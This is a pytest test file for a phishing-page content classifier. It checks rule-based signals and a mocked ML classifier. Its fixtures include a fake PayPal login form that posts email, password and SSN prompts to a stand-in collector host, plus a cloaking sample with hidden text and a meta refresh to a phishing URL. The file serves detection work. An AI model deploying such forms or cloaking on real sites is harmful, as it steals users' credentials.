"""
Tests for content_classifier.py (credential-harvest detection).
All HTTP calls are mocked — no real network I/O.
"""
from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.content_classifier import (
    extract_html_signals,
    _extract_visible_text,
    _parse_hf_result,
    analyze_page_content,
    fetch_page_html,
)


# ---------------------------------------------------------------------------
# Helper HTML fixtures
# ---------------------------------------------------------------------------

CLEAN_HTML = """<!DOCTYPE html>
<html><head><title>Welcome to Example Corp</title></head>
<body><h1>Hello World</h1><p>This is a normal website about software.</p>
</body></html>"""

PHISHING_HTML = """<!DOCTYPE html>
<html><head><title>PayPal – Secure Login</title></head>
<body>
  <form action="https://evil-collector.xyz/steal" method="POST">
    <p>Enter your email and password to continue</p>
    <input type="text" name="email" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <input type="password" name="confirm_password" placeholder="Confirm Password">
    <input type="hidden" name="tok" value="abc">
    <input type="hidden" name="sid" value="xyz">
    <input type="hidden" name="ref" value="1">
    <input type="hidden" name="src" value="2">
    <input type="hidden" name="flow" value="3">
    <button type="submit">Sign In</button>
  </form>
  <p>Your account has been locked out. Verify your identity to restore access.</p>
  <p>Unusual activity detected. Enter your ssn to confirm.</p>
</body></html>"""

CLOAKING_HTML = """<!DOCTYPE html>
<html><body>
<span style="font-size: 0px">hidden text for spam filters</span>
<input type="password" name="pw">
<meta http-equiv="refresh" content="3;url=https://phish.tk/steal">
</body></html>"""


# ---------------------------------------------------------------------------
# extract_html_signals — pure function tests
# ---------------------------------------------------------------------------

def test_clean_html_low_risk():
    score, reasons = extract_html_signals(CLEAN_HTML, "example.com")
    assert score < 0.30
    assert "password_field_present" not in reasons
    assert "external_form_action" not in reasons


def test_phishing_html_high_risk():
    score, reasons = extract_html_signals(PHISHING_HTML, "legit-site.com")
    assert score >= 0.60
    # Should detect external form action
    assert any("external_form_action" in r for r in reasons)
    # Should detect multiple password fields
    assert any("password" in r for r in reasons)
    # Should detect credential keywords
    assert any("credential" in r for r in reasons)


def test_cloaking_detection():
    score, reasons = extract_html_signals(CLOAKING_HTML, "example.com")
    assert any("zero_font" in r for r in reasons)
    assert any("meta_refresh" in r for r in reasons)
    assert score >= 0.40


def test_external_form_action_same_host_not_flagged():
    """Form action on same host should NOT be flagged."""
    html = '<form action="https://mysite.com/submit"><input type="password"></form>'
    score, reasons = extract_html_signals(html, "mysite.com")
    assert not any("external_form_action" in r for r in reasons)


def test_many_hidden_inputs():
    hidden = '<input type="hidden">' * 6
    html = f"<html><body>{hidden}</body></html>"
    _, reasons = extract_html_signals(html, "example.com")
    assert any("hidden_inputs" in r for r in reasons)


# ---------------------------------------------------------------------------
# _extract_visible_text
# ---------------------------------------------------------------------------

def test_extract_visible_text_strips_tags():
    html = "<html><body><script>alert(1)</script><p>Hello World</p></body></html>"
    text = _extract_visible_text(html)
    assert "Hello World" in text
    assert "<" not in text
    assert "alert" not in text  # script removed


def test_extract_visible_text_max_chars():
    html = "<p>" + "A" * 2000 + "</p>"
    text = _extract_visible_text(html, max_chars=100)
    assert len(text) <= 100


# ---------------------------------------------------------------------------
# _parse_hf_result
# ---------------------------------------------------------------------------

def test_parse_hf_credential_label():
    hf = {
        "labels": ["credential harvesting phishing page", "legitimate website", "malware or scam page"],
        "scores": [0.85, 0.10, 0.05],
    }
    risk, label, reasons = _parse_hf_result(hf)
    assert risk > 0.50
    assert "credential" in label
    assert any("ml_credential" in r for r in reasons)


def test_parse_hf_legitimate_label():
    hf = {
        "labels": ["legitimate website", "credential harvesting phishing page", "malware or scam page"],
        "scores": [0.92, 0.05, 0.03],
    }
    risk, label, reasons = _parse_hf_result(hf)
    assert risk == 0.0
    assert reasons == []


def test_parse_hf_empty_response():
    risk, label, reasons = _parse_hf_result({})
    assert risk == 0.0
    assert label == "unknown"


# ---------------------------------------------------------------------------
# analyze_page_content — integration (mocked)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_analyze_page_content_unavailable_if_fetch_fails():
    with patch("app.content_classifier.fetch_page_html", new_callable=AsyncMock, return_value=None):
        result = await analyze_page_content("unreachable.tk")
    assert result["available"] is False
    assert result["content_risk_score"] == 0.0


@pytest.mark.asyncio
async def test_analyze_page_content_rule_based_only():
    """When HF token is missing, only rule-based score is returned."""
    with patch("app.content_classifier.fetch_page_html", new_callable=AsyncMock, return_value=PHISHING_HTML), \
         patch("app.content_classifier._HF_TOKEN", ""):
        result = await analyze_page_content("fake-paypal.tk")

    assert result["available"] is True
    assert result["rule_based_score"] > 0.50
    assert result["ml_score"] is None  # no HF token
    assert result["content_risk_score"] == result["rule_based_score"]


@pytest.mark.asyncio
async def test_analyze_page_content_with_hf_boost():
    """When HF classifies as phishing, ml_score boosts content_risk_score."""
    hf_response = {
        "labels": ["credential harvesting phishing page", "legitimate website"],
        "scores": [0.90, 0.10],
    }
    with patch("app.content_classifier.fetch_page_html", new_callable=AsyncMock, return_value=PHISHING_HTML), \
         patch("app.content_classifier._HF_TOKEN", "hf_fake_token"), \
         patch("app.content_classifier.classify_with_hf", new_callable=AsyncMock, return_value=hf_response):
        result = await analyze_page_content("fake-paypal.tk")

    assert result["available"] is True
    assert result["ml_score"] is not None
    assert result["ml_score"] > 0.50
    assert result["content_risk_score"] >= result["rule_based_score"]
    assert any("ml_credential" in r for r in result["reasons"])


@pytest.mark.asyncio
async def test_analyze_clean_page_skips_hf():
    """A clean page (low rule score) should NOT call HF API."""
    with patch("app.content_classifier.fetch_page_html", new_callable=AsyncMock, return_value=CLEAN_HTML), \
         patch("app.content_classifier._HF_TOKEN", "hf_fake_token"), \
         patch("app.content_classifier.classify_with_hf", new_callable=AsyncMock) as mock_hf:
        result = await analyze_page_content("clean-site.com")

    # HF should NOT be called for clean pages (rule_score < 0.20)
    mock_hf.assert_not_called()
    assert result["content_risk_score"] < 0.30
